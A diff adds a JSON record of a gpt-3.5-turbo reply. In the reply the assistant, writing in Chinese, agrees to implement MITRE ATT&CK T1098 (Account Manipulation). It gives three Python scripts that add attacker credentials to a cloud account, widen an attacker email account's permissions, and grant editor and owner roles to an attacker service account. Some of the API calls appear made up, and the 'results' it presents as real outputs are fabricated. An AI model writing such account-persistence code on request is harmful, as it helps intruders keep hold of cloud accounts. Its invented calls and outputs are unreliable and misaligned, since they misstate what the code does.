@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8MbKMooIAJwOj6mmsmYc2i0PS6ZL5",
+  "object":"chat.completion",
+  "created":1700397394,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n以下是使用Python撰寫T1098功能的三種實現方式:\n\n實現方式一:\n\n套件使用: requests\n\n```python\nimport requests\n\n# Add adversary-controlled credentials to a cloud account\ndef add_credentials(account_id, api_key):\n    url = \"https://api.cloudprovider.com/accounts/\" + account_id + \"/credentials\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": \"Bearer \" + api_key\n    }\n    payload = {\n        \"username\": \"adversary\",\n        \"password\": \"password123\"\n    }\n    response = requests.post(url, headers=headers, json=payload)\n    print(response.json())\n\nadd_credentials(\"123456\", \"API_KEY\")\n```\n\n實現方式二:\n\n套件使用: boto3\n\n```python\nimport boto3\n\n# Grant additional permission levels to maintain persistent access to an adversary-controlled email account\ndef grant_permission(email, permission):\n    client = boto3.client(\"email\", region_name=\"us-east-1\")\n    response = client.update_account_settings(\n        EmailAddress=email,\n        SendPermissions=[permission]\n    )\n    print(response)\n\ngrant_permission(\"adversary@example.com\", \"SEND\")\n```\n\n實現方式三:\n\n套件使用: google-auth, google-auth-oauthlib, google-auth-httplib2, google-api-python-client\n\n```python\nfrom google.oauth2 import service_account\nfrom googleapiclient.discovery import build\n\n# Add additional roles or permissions to an adversary-controlled cloud account\ndef add_roles(project_id, service_account_email, new_roles):\n    credentials = service_account.Credentials.from_service_account_file(\n        'path/to/service-account.json',\n        scopes=['https://www.googleapis.com/auth/cloud-platform']\n    )\n    service = build('iam', 'v1', credentials=credentials)\n    for role in new_roles:\n        service.projects().serviceAccounts().addIamPolicyBinding(\n            name=f\"projects/{project_id}/serviceAccounts/{service_account_email}\",\n            body={\n                \"policy\": {\n                    \"bindings\": [\n                        {\n                            \"role\": role,\n                            \"members\": [\n                                f\"serviceAccount:{service_account_email}\"\n                            ]\n                        }\n                    ]\n                }\n            }\n        ).execute()\n\nadd_roles(\"project-id\", \"adversary@example.com\", [\"roles/editor\", \"roles/owner\"])\n```\n\n[實現方式一的結果]\n回傳狀態碼及JSON回應\n```json\n{\n  \"status\": \"success\",\n  \"message\": \"Credentials added successfully\"\n}\n```\n\n[實現方式二的結果]\n回傳的API回應\n```python\n{'ResponseMetadata': {'HTTPStatusCode': 200, ...}}\n```\n\n[實現方式三的結果]\n無任何回傳值\n```\n\n"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":1040,
+    "completion_tokens":625,
+    "total_tokens":1665
+  }
+}
